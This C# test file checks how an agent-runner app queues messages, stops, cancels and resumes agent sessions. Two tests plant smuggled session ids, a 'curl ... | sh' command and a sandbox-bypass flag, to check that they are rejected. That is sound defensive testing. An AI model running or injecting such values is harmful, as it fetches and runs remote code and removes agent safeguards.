using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text.Json;
using IDevelop.Execution;
using IDevelop.TestSupport;
using IDevelop.Workflows;
using static IDevelop.Core.Tests.AttemptEvents;
using static IDevelop.TestSupport.FakeAgents;
using static IDevelop.TestSupport.FakeRule;
using static IDevelop.TestSupport.Processes;

namespace IDevelop.Core.Tests;

/// <summary>A person talks to a task's agent through <see cref="ProjectRuns"/>, with the fake agent behind on-disk shims.</summary>
[Collection(ProcessCollection.Name)]
public sealed class ConversationTests : IDisposable
{
    private const string Session = "01a108d7-464d-77a3-8908-a36f38ce6c14";
    private static readonly TaskId SayHiId = TestTasks.Design;
    private static readonly TimeSpan Patience = TimeSpan.FromSeconds(60);

    private static readonly Dictionary<ClientId, ExecutionSettings> Settings = new()
    {
        [ClientId.ClaudeCode] = new ExecutionSettings(ClientId.ClaudeCode) { Model = "claude-haiku-4-5", Reasoning = "high" },
        [ClientId.Codex] = new ExecutionSettings(ClientId.Codex) { Model = "gpt-6-sol", Reasoning = "high" },
        [ClientId.Pi] = new ExecutionSettings(ClientId.Pi) { Model = "deepseek/deepseek-v4-pro", Reasoning = "high" },
        [ClientId.Antigravity] = new ExecutionSettings(ClientId.Antigravity) { Model = "gemini-3.8-flash", Reasoning = "low" },
    };

    private static readonly Dictionary<ClientId, string[]> ResumeArguments = new()
    {
        [ClientId.ClaudeCode] =
            ["-p", "--input-format", "stream-json", "--output-format", "stream-json", "--verbose", "--include-partial-messages", "--model", "claude-haiku-4-5", "--effort", "high", "--permission-mode", "acceptEdits", "--resume", Session, "--permission-prompts", "none"],
        [ClientId.Codex] =
        ["app-server", "-c", "approval_policy=never", "-c", "features.default_mode_request_user_input=false"],
        [ClientId.Pi] = ["-p", "--mode", "json", "--model", "deepseek/deepseek-v4-pro", "--thinking", "high", "--session-id", Session],
        [ClientId.Antigravity] =
        [
            "--input-format", "stream-json", "--output-format", "stream-json", "--model", "gemini-3.8-flash", "--effort", "low", "--mode", "accept-edits", "--print=",
            "--conversation", Session,
        ],
    };

    private readonly TempFolder _temp = new();
    private readonly FakeClients _fakes;
    private readonly string _project;
    private readonly string _evidence;
    private readonly string _gate;
    private readonly Processes _spawned = new();

    public ConversationTests()
    {
        _fakes = new FakeClients(_temp.Create("bin"));
        _project = _temp.Create("project");
        _evidence = _temp.Create("evidence");
        _gate = Evidence("go");
    }

    public static TheoryData<ClientId> AllClients => new(Clients.All);

    public void Dispose()
    {
        File.WriteAllText(_gate, "");
        _spawned.Dispose();
        _temp.Dispose();
    }

    [Theory]
    [MemberData(nameof(AllClients))]
    public async Task A_message_sent_during_a_turn_waits_for_it_and_the_next_turn_resumes_the_session_with_it(ClientId client)
    {
        Install(_fakes, client,
            Resuming(client, Session).RecordArguments(Evidence("turn-2.json")).CaptureStdin(Evidence("turn-2.txt")).Print(SessionLine(client, Session)).Print(ReplyLines(client, "Wrote banana.")),
            Fresh(client).Print(SessionLine(client, Session)).WaitForFile(_gate).Print(ReplyLines(client, "Which fruit?")));
        var clients = await _fakes.DiscoverAsync();
        await using var runs = ProjectRuns.Open(_project, clients);
        var settled = NextSettled(runs);
        var started = Assert.IsType<StartResult.Started>(runs.Start(SayHi(Settings[client])));
        await WaitUntilAsync(() => runs.Latest[SayHiId].SessionId == Session);

        var sent = await runs.SendAsync(SayHi(Settings[client]), "banana", stopTurn: false);

        Assert.Equal(new SendResult.Queued(), sent);
        await WaitUntilAsync(() => runs.Latest[SayHiId].Queued is [{ Text: "banana" }]);
        Assert.Equal(AttemptStatus.Running, runs.Latest[SayHiId].Status);
        File.WriteAllText(_gate, "");
        var record = await settled;
        Assert.Equal((started.Attempt.Id, AttemptStatus.Succeeded, "Wrote banana.", Session), (record.Id, record.Status, record.Result, record.SessionId));
        Assert.Equal([new TurnRecord(1, null, TurnOutcome.Succeeded, "Which fruit?"), new TurnRecord(2, "banana", TurnOutcome.Succeeded, "Wrote banana.")], record.Turns);
        Assert.Equal(ResumeArguments[client], RecordedArguments("turn-2.json"));
        Assert.Equal(
            client == ClientId.Antigravity ? """{"event":"user","message":{"role":"user","content":"banana"}}""" + "\n" : "banana",
            File.ReadAllText(Evidence("turn-2.txt")));
        Assert.Empty(runs.Active);
        await using var reopened = ProjectRuns.Open(_project, clients);
        Assert.Equal(record.Turns, reopened.Latest[SayHiId].Turns);
    }

    [Fact]
    public async Task A_message_sent_during_a_later_turn_waits_for_it_and_starts_a_third_turn()
    {
        var second = Evidence("second");
        Install(_fakes, ClientId.Codex,
            Resuming(ClientId.Codex, Session).CaptureStdin(Evidence("resumed.txt")).Print(SessionLine(ClientId.Codex, Session)).WaitForFile(second).Print(ReplyLines(ClientId.Codex, "Noted.")),
            Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).WaitForFile(_gate).Print(ReplyLines(ClientId.Codex, "Which fruit?")));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var codex = SayHi(Settings[ClientId.Codex]);
        var settled = NextSettled(runs);
        runs.Start(codex);
        await WaitUntilAsync(() => runs.Latest[SayHiId].SessionId == Session);
        await runs.SendAsync(codex, "banana", stopTurn: false);
        await WaitUntilAsync(() => runs.Latest[SayHiId].Queued is [{ Text: "banana" }]);
        File.WriteAllText(_gate, "");
        await WaitUntilAsync(() => runs.Latest[SayHiId].Turns is [_, { Outcome: TurnOutcome.Running }]);

        Assert.Equal(new SendResult.Queued(), await runs.SendAsync(codex, "and an apple", stopTurn: false));

        await WaitUntilAsync(() => runs.Latest[SayHiId].Queued is [{ Text: "and an apple" }]);
        File.WriteAllText(second, "");
        var record = await settled;
        Assert.Equal((AttemptStatus.Succeeded, "Noted."), (record.Status, record.Result));
        Assert.Equal(
            [
                new TurnRecord(1, null, TurnOutcome.Succeeded, "Which fruit?"),
                new TurnRecord(2, "banana", TurnOutcome.Succeeded, "Noted."),
                new TurnRecord(3, "and an apple", TurnOutcome.Succeeded, "Noted."),
            ],
            record.Turns);
        Assert.Equal("and an apple", File.ReadAllText(Evidence("resumed.txt")));
    }

    [Fact]
    public async Task Two_messages_sent_during_one_turn_reach_the_next_turn_together_separated_by_a_blank_line()
    {
        Install(_fakes, ClientId.Codex,
            Resuming(ClientId.Codex, Session).CaptureStdin(Evidence("turn-2.txt")).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Wrote both.")),
            Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).WaitForFile(_gate).Print(ReplyLines(ClientId.Codex, "Which fruit?")));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var codex = SayHi(Settings[ClientId.Codex]);
        var settled = NextSettled(runs);
        runs.Start(codex);
        await WaitUntilAsync(() => runs.Latest[SayHiId].SessionId == Session);

        await runs.SendAsync(codex, "banana", stopTurn: false);
        await runs.SendAsync(codex, "and an apple", stopTurn: false);

        await WaitUntilAsync(() => runs.Latest[SayHiId].Queued is [{ Text: "banana" }, { Text: "and an apple" }]);
        File.WriteAllText(_gate, "");
        var record = await settled;
        Assert.Equal("banana\n\nand an apple", File.ReadAllText(Evidence("turn-2.txt")));
        Assert.Equal(new TurnRecord(2, "banana\n\nand an apple", TurnOutcome.Succeeded, "Wrote both."), record.Turns[^1]);
    }

    [Fact]
    public async Task A_message_sent_after_the_turns_client_exited_with_nothing_waiting_is_refused_as_ending()
    {
        Install(_fakes, ClientId.Codex, Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Done.")));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var codex = SayHi(Settings[ClientId.Codex]);
        var answer = new TaskCompletionSource<SendResult>(TaskCreationOptions.RunContinuationsAsynchronously);
        runs.Changed += async (_, _) =>
        {
            // The drain waits for this handler at the agent's answer, so the attempt still runs after its client exits.
            if (runs.Latest.GetValueOrDefault(SayHiId) is { Status: AttemptStatus.Running, Activity: [.., { Text: "Done." }] } && !answer.Task.IsCompleted)
            {
                SpinWait.SpinUntil(() => runs.CheckSend(codex) is not null, Patience);
                answer.TrySetResult(await runs.SendAsync(codex, "banana", stopTurn: false));
            }
        };
        var settled = NextSettled(runs);

        runs.Start(codex);

        Assert.Equal(new SendResult.Refused(new SendProblem.Ending("Say hi")), await answer.Task.WaitAsync(2 * Patience));
        var record = await settled;
        Assert.Equal((AttemptStatus.Succeeded, 0), (record.Status, record.Queued.Count));
        Assert.Equal([new TurnRecord(1, null, TurnOutcome.Succeeded, "Done.")], record.Turns);
    }

    [Fact]
    public async Task Stop_and_send_stops_the_turns_process_tree_and_the_next_turn_resumes_at_once()
    {
        var grandchild = Evidence("grandchild.pid");
        Install(_fakes, ClientId.Codex,
            Resuming(ClientId.Codex, Session).CaptureStdin(Evidence("turn-2.txt")).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Using an apple.")),
            Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).SpawnSleepingChild(grandchild).Hang());
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var settled = NextSettled(runs);
        var started = Assert.IsType<StartResult.Started>(runs.Start(SayHi(Settings[ClientId.Codex])));
        var first = started.Attempt.Process!.Value.Id;
        _spawned.Add(first);
        var grandchildId = await _spawned.PidAsync(grandchild);
        await WaitUntilAsync(() => runs.Latest[SayHiId].SessionId == Session);

        Assert.Equal(new SendResult.Queued(), await runs.SendAsync(SayHi(Settings[ClientId.Codex]), "Stop. Use an apple.", stopTurn: true));

        var record = await settled;
        Assert.Equal((AttemptStatus.Succeeded, "Using an apple."), (record.Status, record.Result));
        Assert.Equal(
            [new TurnRecord(1, null, TurnOutcome.Stopped, null), new TurnRecord(2, "Stop. Use an apple.", TurnOutcome.Succeeded, "Using an apple.")],
            record.Turns);
        Assert.Equal("Stop. Use an apple.", File.ReadAllText(Evidence("turn-2.txt")));
        AssertGone(first);
        AssertGone(grandchildId);
    }

    [Fact]
    public async Task Stop_and_send_after_the_turns_client_exited_stops_nothing_and_the_turn_keeps_its_outcome()
    {
        var server = Evidence("server.pid");
        Install(_fakes, ClientId.Codex,
            Resuming(ClientId.Codex, Session).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Using an apple.")),
            Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Which fruit?")).SpawnSleepingChild(server));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var settled = NextSettled(runs);
        var client = Assert.IsType<StartResult.Started>(runs.Start(SayHi(Settings[ClientId.Codex]))).Attempt.Process!.Value.Id;
        var serverId = await _spawned.PidAsync(server);
        await WaitUntilAsync(() => runs.Latest[SayHiId].SessionId == Session && Exited(client));

        // The sleeping child holds the turn's output open, so the run has not seen the turn end yet.
        Assert.Equal(new SendResult.Queued(), await runs.SendAsync(SayHi(Settings[ClientId.Codex]), "Use an apple.", stopTurn: true));

        var record = await settled;
        Assert.Equal(
            [new TurnRecord(1, null, TurnOutcome.Succeeded, "Which fruit?"), new TurnRecord(2, "Use an apple.", TurnOutcome.Succeeded, "Using an apple.")],
            record.Turns);
        Assert.False(Exited(serverId), "the process the turn left running was stopped");
    }

    /// <summary>On Linux and macOS, .NET cannot find an exited client's children, so only Windows can see a stop here.</summary>
    [Fact]
    public async Task Cancel_after_the_turns_client_exited_stops_nothing_and_records_cancelled()
    {
        var server = Evidence("server.pid");
        Install(_fakes, ClientId.Codex, Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Which fruit?")).SpawnSleepingChild(server));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var settled = NextSettled(runs);
        var client = Assert.IsType<StartResult.Started>(runs.Start(SayHi(Settings[ClientId.Codex]))).Attempt.Process!.Value.Id;
        var serverId = await _spawned.PidAsync(server);
        await WaitUntilAsync(() => runs.Latest[SayHiId].Activity is [.., { Text: "Which fruit?" }] && Exited(client));

        // The sleeping child holds the turn's output open, so the run has not seen the turn end yet.
        await runs.CancelAsync(SayHiId);

        var record = await settled;
        Assert.Equal((AttemptStatus.Cancelled, (string?)null, "Which fruit?"), (record.Status, record.Detail, record.Result));
        Assert.Equal([new TurnRecord(1, null, TurnOutcome.Stopped, "Which fruit?")], record.Turns);
        using var survivor = Process.GetProcessById(serverId);
        Assert.False(survivor.WaitForExit(TimeSpan.FromSeconds(1)), "the process the turn left running was stopped");
    }

    [Fact]
    public async Task Cancel_during_a_later_turn_cancels_the_attempt()
    {
        Install(_fakes, ClientId.Codex,
            Resuming(ClientId.Codex, Session).Print(SessionLine(ClientId.Codex, Session)).Hang(),
            Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).WaitForFile(_gate).Print(ReplyLines(ClientId.Codex, "Which fruit?")));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var settled = NextSettled(runs);
        runs.Start(SayHi(Settings[ClientId.Codex]));
        await WaitUntilAsync(() => runs.Latest[SayHiId].SessionId == Session);
        await runs.SendAsync(SayHi(Settings[ClientId.Codex]), "banana", stopTurn: false);
        await WaitUntilAsync(() => runs.Latest[SayHiId].Queued is [{ Text: "banana" }]);
        File.WriteAllText(_gate, "");
        await WaitUntilAsync(() => runs.Latest[SayHiId].Turns is [_, { Outcome: TurnOutcome.Running }] && runs.Latest[SayHiId].Process is not null);
        var second = runs.Latest[SayHiId].Process!.Value.Id;
        _spawned.Add(second);

        await runs.CancelAsync(SayHiId);

        var record = await settled;
        Assert.Equal((AttemptStatus.Cancelled, (string?)null), (record.Status, record.Detail));
        Assert.Equal([new TurnRecord(1, null, TurnOutcome.Succeeded, "Which fruit?"), new TurnRecord(2, "banana", TurnOutcome.Stopped, null)], record.Turns);
        AssertGone(second);
    }

    [Fact]
    public async Task Sending_to_a_task_that_is_not_running_continues_its_interrupted_attempt_in_a_new_one_that_resumes_its_session()
    {
        Install(_fakes, ClientId.Codex,
            Resuming(ClientId.Codex, Session).RecordArguments(Evidence("continue.json")).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Picked up where I stopped.")),
            Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).Hang());
        var clients = await _fakes.DiscoverAsync();
        var leaving = ProjectRuns.Open(_project, clients);
        var interrupted = Assert.IsType<StartResult.Started>(leaving.Start(SayHi(Settings[ClientId.Codex]))).Attempt;
        _spawned.Add(interrupted.Process!.Value.Id);
        await WaitUntilAsync(() => leaving.Latest[SayHiId].SessionId == Session);
        await leaving.DisposeAsync();
        await using var runs = ProjectRuns.Open(_project, clients);
        Assert.Equal(AttemptStatus.Interrupted, runs.Latest[SayHiId].Status);
        Assert.Null(runs.CheckSend(SayHi(Settings[ClientId.Codex])));
        var settled = NextSettled(runs);

        var continued = Assert.IsType<SendResult.Continued>(await runs.SendAsync(SayHi(Settings[ClientId.Codex]), "Go on.", stopTurn: false)).Attempt;

        Assert.Equal((AttemptStatus.Running, (AttemptId?)interrupted.Id, Session), (continued.Status, continued.Continues, continued.SessionId));
        var record = await settled;
        Assert.Equal((continued.Id, AttemptStatus.Succeeded, "Picked up where I stopped."), (record.Id, record.Status, record.Result));
        Assert.Equal([new TurnRecord(1, "Go on.", TurnOutcome.Succeeded, "Picked up where I stopped.")], record.Turns);
        Assert.Equal(ResumeArguments[ClientId.Codex], RecordedArguments("continue.json"));
        var attempts = Path.Combine(_project, ".idp", "attempts");
        var earlier = AttemptReducer.Replay(AttemptLog.Read(AttemptLog.FolderOf(attempts, SayHiId, interrupted.Id)))!;
        Assert.Equal((AttemptStatus.Interrupted, "The project was closed while this task ran."), (earlier.Status, earlier.Detail));
        var requested = Assert.IsType<AttemptEvent.Requested>(AttemptLog.Read(AttemptLog.FolderOf(attempts, SayHiId, record.Id))[0]);
        Assert.Equal(("Go on.", new Continuation(interrupted.Id, Session)), (requested.Prompt, requested.Continues));
    }

    [Fact]
    public async Task The_earlier_attempts_of_a_conversation_are_the_ones_its_continuations_resumed_oldest_first()
    {
        Install(_fakes, ClientId.Codex,
            Resuming(ClientId.Codex, Session).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Noted.")),
            Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Which fruit?")));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var codex = SayHi(Settings[ClientId.Codex]);
        async Task<AttemptRecord> Settled(Func<Task<AttemptId>> start)
        {
            var settled = NextSettled(runs);
            var id = await start();
            var record = await settled;
            Assert.Equal((id, AttemptStatus.Succeeded), (record.Id, record.Status));
            return record;
        }

        var unrelated = await Settled(() => Task.FromResult(Assert.IsType<StartResult.Started>(runs.Start(codex)).Attempt.Id));
        var asked = await Settled(() => Task.FromResult(Assert.IsType<StartResult.Started>(runs.Start(codex)).Attempt.Id));
        var answered = await Settled(async () => Assert.IsType<SendResult.Continued>(await runs.SendAsync(codex, "banana", stopTurn: false)).Attempt.Id);
        var latest = await Settled(async () => Assert.IsType<SendResult.Continued>(await runs.SendAsync(codex, "and an apple", stopTurn: false)).Attempt.Id);

        var earlier = runs.EarlierAttempts(latest);

        Assert.Equal([asked.Id, answered.Id], earlier.Select(attempt => attempt.Id));
        Assert.Equal([new TurnRecord(1, null, TurnOutcome.Succeeded, "Which fruit?")], earlier[0].Turns);
        Assert.Equal([new TurnRecord(1, "banana", TurnOutcome.Succeeded, "Noted.")], earlier[1].Turns);
        Assert.Equal(((AttemptId?)answered.Id, Session), (latest.Continues, latest.SessionId));
        Assert.Empty(runs.EarlierAttempts(asked));
        Assert.Empty(runs.EarlierAttempts(unrelated));
    }

    [Fact]
    public async Task A_message_is_refused_with_a_reason_when_there_is_nothing_to_continue_or_the_task_cannot_start()
    {
        Install(_fakes, ClientId.Codex, Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).Print(ReplyLines(ClientId.Codex, "Done.")));
        _fakes.Install("claude", ClaudeSignedIn);
        var clients = await _fakes.DiscoverAsync();
        await using var runs = ProjectRuns.Open(_project, clients);
        var codex = SayHi(Settings[ClientId.Codex]);

        Assert.Equal(new SendResult.Refused(new SendProblem.EmptyMessage()), await runs.SendAsync(codex, " \n", stopTurn: false));
        Assert.Equal(new SendResult.Refused(new SendProblem.NeverRan()), await runs.SendAsync(codex, "banana", stopTurn: false));
        Assert.Equal(new SendProblem.NeverRan(), runs.CheckSend(codex));
        Assert.Empty(Directory.EnumerateDirectories(Path.Combine(_project, ".idp", "attempts", SayHiId.ToString())));
        var settled = NextSettled(runs);
        runs.Start(codex);
        Assert.Equal(AttemptStatus.Succeeded, (await settled).Status);

        var claude = SayHi(Settings[ClientId.ClaudeCode]);
        Assert.Equal(new SendResult.Refused(new SendProblem.ClientChanged(ClientId.Codex, ClientId.ClaudeCode)), await runs.SendAsync(claude, "banana", stopTurn: false));
        Assert.Equal(new SendProblem.ClientChanged(ClientId.Codex, ClientId.ClaudeCode), runs.CheckSend(claude));
        var unoffered = SayHi(Settings[ClientId.Codex] with { Model = "gpt-4" });
        Assert.Equal(
            new SendResult.Refused(new SendProblem.CannotStart(new StartProblem.ModelNotOffered(ClientId.Codex, "gpt-4"))),
            await runs.SendAsync(unoffered, "banana", stopTurn: false));
        Assert.Equal(new SendProblem.CannotStart(new StartProblem.ModelNotOffered(ClientId.Codex, "gpt-4")), runs.CheckSend(unoffered));
        Assert.Single(Directory.EnumerateDirectories(Path.Combine(_project, ".idp", "attempts", SayHiId.ToString())));
    }

    [Fact]
    public async Task A_message_is_refused_when_the_client_reported_no_session()
    {
        Install(_fakes, ClientId.Codex, Fresh(ClientId.Codex).WaitForFile(_gate).Print(ReplyLines(ClientId.Codex, "Done.")));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var settled = NextSettled(runs);
        var codex = SayHi(Settings[ClientId.Codex]);
        runs.Start(codex);

        Assert.Equal(new SendResult.Refused(new SendProblem.NoSessionYet(ClientId.Codex)), await runs.SendAsync(codex, "banana", stopTurn: true));
        Assert.Equal(new SendProblem.NoSessionYet(ClientId.Codex), runs.CheckSend(codex));

        File.WriteAllText(_gate, "");
        Assert.Equal(AttemptStatus.Succeeded, (await settled).Status);
        Assert.Equal(new SendResult.Refused(new SendProblem.NoSession(ClientId.Codex)), await runs.SendAsync(codex, "banana", stopTurn: false));
        Assert.Equal(new TerminalResult.Refused(new TerminalProblem.NoSession(ClientId.Codex)), runs.OpenInTerminal(SayHiId));
    }

    /// <summary>A shared repository can carry attempt logs, so a session id read from one must never reach a command.</summary>
    [Theory]
    [InlineData("x; curl https://example.invalid/p | sh")]
    [InlineData("--dangerously-bypass-approvals-and-sandbox")]
    public async Task A_session_id_in_an_attempt_log_that_is_not_plain_is_neither_resumed_nor_handed_to_a_terminal(string planted)
    {
        Install(_fakes, ClientId.Codex, Fresh(ClientId.Codex).Print(ReplyLines(ClientId.Codex, "Done.")));
        PlantLog(LaunchedAt1s, Said(2, new AgentEvent.SessionStarted(planted)), Said(3, new AgentEvent.Succeeded("Done.")), Exit(4, 0));

        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var codex = SayHi(Settings[ClientId.Codex]);

        Assert.Equal(new SendProblem.NoSession(ClientId.Codex), runs.CheckSend(codex));
        Assert.Equal(new SendResult.Refused(new SendProblem.NoSession(ClientId.Codex)), await runs.SendAsync(codex, "banana", stopTurn: false));
        Assert.Equal(new TerminalResult.Refused(new TerminalProblem.NoSession(ClientId.Codex)), runs.OpenInTerminal(SayHiId));
        Assert.Equal(["iDevelop ignored the session id Codex reported, because it is not a plain id."], runs.Latest[SayHiId].Activity.Select(line => line.Text));
        Assert.Single(Directory.EnumerateDirectories(AttemptLog.TaskFolder(Path.Combine(_project, ".idp", "attempts"), SayHiId)));
    }

    [Fact]
    public async Task A_session_id_that_a_client_prints_and_that_is_not_plain_is_ignored()
    {
        Install(_fakes, ClientId.Codex,
            Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, "x; curl https://example.invalid/p | sh")).Print(ReplyLines(ClientId.Codex, "Done.")));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var codex = SayHi(Settings[ClientId.Codex]);
        var settled = NextSettled(runs);
        runs.Start(codex);

        var record = await settled;

        Assert.Equal((AttemptStatus.Succeeded, (string?)null), (record.Status, record.SessionId));
        Assert.Equal(["iDevelop ignored the session id Codex reported, because it is not a plain id.", "Done."], record.Activity.Select(line => line.Text));
        Assert.Equal(new SendResult.Refused(new SendProblem.NoSession(ClientId.Codex)), await runs.SendAsync(codex, "banana", stopTurn: false));
    }

    [Fact]
    public async Task A_message_to_a_run_that_is_stopping_is_refused()
    {
        Install(_fakes, ClientId.Codex, Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).Hang());
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var codex = SayHi(Settings[ClientId.Codex]);
        var answer = new TaskCompletionSource<SendResult>(TaskCreationOptions.RunContinuationsAsynchronously);
        runs.Changed += async (_, _) =>
        {
            // The drain waits for this handler, so the run is still stopping and has not exited yet.
            if (runs.Latest.GetValueOrDefault(SayHiId) is { Stopping: true })
            {
                answer.TrySetResult(await runs.SendAsync(codex, "banana", stopTurn: false));
            }
        };
        var started = Assert.IsType<StartResult.Started>(runs.Start(codex));
        _spawned.Add(started.Attempt.Process!.Value.Id);
        await WaitUntilAsync(() => runs.Latest[SayHiId].SessionId == Session);

        await runs.CancelAsync(SayHiId);

        Assert.Equal(new SendResult.Refused(new SendProblem.Ending("Say hi")), await answer.Task.WaitAsync(Patience));
    }

    [Fact]
    public async Task A_message_to_a_task_that_another_window_runs_is_refused()
    {
        Install(_fakes, ClientId.Codex, Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).Hang());
        var clients = await _fakes.DiscoverAsync();
        await using var first = ProjectRuns.Open(_project, clients);
        await using var second = ProjectRuns.Open(_project, clients);
        var codex = SayHi(Settings[ClientId.Codex]);
        var started = Assert.IsType<StartResult.Started>(first.Start(codex));
        _spawned.Add(started.Attempt.Process!.Value.Id);

        Assert.Equal(new SendResult.Refused(new SendProblem.CannotStart(new StartProblem.AlreadyRunning(SayHiId, "Say hi"))), await second.SendAsync(codex, "banana", stopTurn: false));
        Assert.Equal(
            new TerminalResult.Refused(new TerminalProblem.Blocked(new StartProblem.AlreadyRunning(SayHiId, "Say hi"))),
            second.OpenInTerminal(SayHiId));

        await first.CancelAsync(SayHiId);
        await WaitUntilAsync(() => first.Active.IsEmpty);
    }

    [Fact]
    public async Task A_crash_between_turns_reconciles_to_interrupted_without_checking_the_ended_turns_process()
    {
        using var firstTurn = StartAsTheFirstTurn(out var launched);
        PlantLog(launched, Said(2, new AgentEvent.SessionStarted(Session)), Sent(3, "banana"), Said(4, new AgentEvent.Succeeded("Which fruit?")), Exit(5, 0));

        await using var runs = ProjectRuns.Open(_project, new ClientDirectory(_fakes.Resolver));

        var record = runs.Latest[SayHiId];
        Assert.Equal((AttemptStatus.Interrupted, "iDevelop stopped before the next turn started.", "Which fruit?"), (record.Status, record.Detail, record.Result));
        Assert.Equal([new TurnRecord(1, null, TurnOutcome.Succeeded, "Which fruit?")], record.Turns);
        Assert.Equal(["banana"], record.Queued.Select(message => message.Text));
        Assert.False(firstTurn.WaitForExit(TimeSpan.FromSeconds(1)), "reconciliation stopped the ended turn's process");
    }

    [Fact]
    public async Task A_crash_before_a_later_turn_launched_reconciles_to_interrupted_without_checking_the_earlier_turns_process()
    {
        using var firstTurn = StartAsTheFirstTurn(out var launched);
        PlantLog(
            launched,
            Said(2, new AgentEvent.SessionStarted(Session)), Sent(3, "banana"), Said(4, new AgentEvent.Succeeded("Which fruit?")), Exit(5, 0), NextTurn(6, "banana"));

        await using var runs = ProjectRuns.Open(_project, new ClientDirectory(_fakes.Resolver));

        const string Reason = "iDevelop stopped while starting the client. If the client started, it may still be running.";
        var record = runs.Latest[SayHiId];
        Assert.Equal((AttemptStatus.Interrupted, Reason), (record.Status, record.Detail));
        Assert.Equal([new TurnRecord(1, null, TurnOutcome.Succeeded, "Which fruit?"), new TurnRecord(2, "banana", TurnOutcome.Interrupted, null, Reason)], record.Turns);
        Assert.False(firstTurn.WaitForExit(TimeSpan.FromSeconds(1)), "reconciliation stopped the earlier turn's process");
    }

    [Fact]
    public async Task Opening_in_a_terminal_is_refused_while_a_turn_runs_and_then_recorded_on_the_waiting_attempt()
    {
        Install(_fakes, ClientId.Codex, Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).WaitForFile(_gate).Print(ReplyLines(ClientId.Codex, "Done.")));
        var clients = await _fakes.DiscoverAsync();
        await using var runs = ProjectRuns.Open(_project, clients);
        Assert.Equal(new TerminalResult.Refused(new TerminalProblem.NeverRan()), runs.OpenInTerminal(SayHiId));
        var settled = NextSettled(runs);
        var started = Assert.IsType<StartResult.Started>(runs.Start(SayHi(Settings[ClientId.Codex]) with { Conversation = ConversationMode.Chat }));
        await WaitUntilAsync(() => runs.Latest[SayHiId].SessionId == Session);

        Assert.Equal(new TerminalResult.Refused(new TerminalProblem.TurnRunning("Say hi")), runs.OpenInTerminal(SayHiId));

        File.WriteAllText(_gate, "");
        var record = await settled;
        var before = DateTimeOffset.UtcNow;
        var command = OperatingSystem.IsWindows()
            ? $"Set-Location -LiteralPath '{_project}'; codex resume {Session}"
            : $"cd '{_project}' && codex resume {Session}";
        Assert.Equal(new TerminalResult.HandedOff(_project, command), runs.OpenInTerminal(SayHiId));
        var handed = runs.Latest[SayHiId];
        Assert.Equal((AttemptStatus.WaitingForInput, "Done.", _project, command), (handed.Status, handed.Result, handed.Terminal?.Folder, handed.Terminal?.Command));
        Assert.InRange(handed.Terminal!.At, before, DateTimeOffset.UtcNow);
        Assert.Equal((record.Id, record.EndedAt, record.Detail), (handed.Id, handed.EndedAt, handed.Detail));
        Assert.Equal(record.Turns, handed.Turns);
        var lastLine = File.ReadLines(Path.Combine(AttemptLog.FolderOf(Path.Combine(_project, ".idp", "attempts"), SayHiId, started.Attempt.Id), "events.jsonl")).Last();
        using var json = JsonDocument.Parse(lastLine);
        Assert.Equal(
            ("handedToTerminal", _project, command),
            (json.RootElement.GetProperty("type").GetString(), json.RootElement.GetProperty("folder").GetString(), json.RootElement.GetProperty("command").GetString()));
        await using var reopened = ProjectRuns.Open(_project, clients);
        Assert.Equal(handed.Terminal, reopened.Latest[SayHiId].Terminal);
    }

    /// <summary>
    /// The sender starts once the first turn's exit is visible, which is when the run tries to start the next turn, and
    /// stops at its first message the run does not queue. So it races the run for its gate only around that launch, and
    /// it queues a bounded number of messages, each of which the run flushes to disk. A run that stays open after its
    /// next turn fails to start loses a message in most runs of this test, not in every run. Deleting a running .cmd
    /// shim would end its batch early on Windows.
    /// </summary>
    [UnixFact]
    public async Task Every_message_accepted_while_a_later_turn_fails_to_start_reaches_the_log()
    {
        var shim = Install(_fakes, ClientId.Codex, Fresh(ClientId.Codex).Print(SessionLine(ClientId.Codex, Session)).WaitForFile(_gate).Print(ReplyLines(ClientId.Codex, "Which fruit?")));
        await using var runs = ProjectRuns.Open(_project, await _fakes.DiscoverAsync());
        var codex = SayHi(Settings[ClientId.Codex]);
        var settled = NextSettled(runs);
        var started = Assert.IsType<StartResult.Started>(runs.Start(codex));
        await WaitUntilAsync(() => runs.Latest[SayHiId].SessionId == Session);
        await runs.SendAsync(codex, "banana", stopTurn: false);
        await WaitUntilAsync(() => runs.Latest[SayHiId].Queued is [{ Text: "banana" }]);
